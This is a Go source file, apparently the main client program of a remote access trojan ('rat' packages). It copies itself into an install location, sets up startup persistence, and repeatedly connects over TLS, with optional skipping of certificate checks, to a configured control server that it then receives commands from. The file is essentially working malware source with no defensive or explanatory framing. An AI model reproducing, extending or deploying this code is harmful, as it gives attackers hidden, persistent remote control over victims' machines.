package main

import (
	"crypto/tls"
	"fmt"
	"os"
	"os/exec"
	"rat/client/install"
	"rat/client/startup"
	"rat/shared"
	"rat/shared/installpath"
	"rat/shared/network"

	"github.com/xtaci/smux"
)

var conn *tls.Conn

func main() {
	err := ParseConfig()
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	if Config.Install != installpath.None && !install.IsInstalled(Config.Install) {
		fmt.Println("Not installed, installing...")
		file, err := install.Install(Config.Name, Config.Install)
		if err != nil {
			fmt.Println("install:", err.Error())
		} else {
			fmt.Println("Installed to", file)
			err = exec.Command(file).Start()
			if err != nil {
				fmt.Println(err.Error())
			} else {
				os.Exit(0)
			}
		}
	}

	err = startup.InstallCurrent(Config.Name)
	if err != nil {
		fmt.Println("Install failed:", err.Error())
	}

	start(Config)
}

func start(config shared.BinaryConfig) {
	for {
		host := config.Host
		fmt.Println("Connecting to", host)

		var err error
		conn, err = tls.Dial("tcp", host, &tls.Config{
			InsecureSkipVerify: Config.InvalidSSL,
		})
		session, err := smux.Client(conn, nil)
		if err != nil {

			panic(err)
		}
		control, err := session.AcceptStream()
		if err != nil {
			panic(err)
		}
		fmt.Println("stream opened")

		con := Connection{
			Conn:    session,
			control: control,
			Writer:  network.Writer{control},
			Reader:  network.Reader{control},
		}

		if err != nil {
			panic(err)
		}

		Queue = make(chan OutgoingPacket)
		//Transfers = make(TransfersMap)

		go func() {
			for {
				packet := <-Queue

				packet.Init()
				con.WritePacket(packet)
			}
		}()

		con.Init()

		con.recvLoop()

		/* end:
		Close()
		time.Sleep(time.Second * time.Duration(config.Delay)) */
	}
}

// Close is called when connection is lost
func Close() {

}

func Uninstall() {
	startup.Uninstall(Config.Name)
}
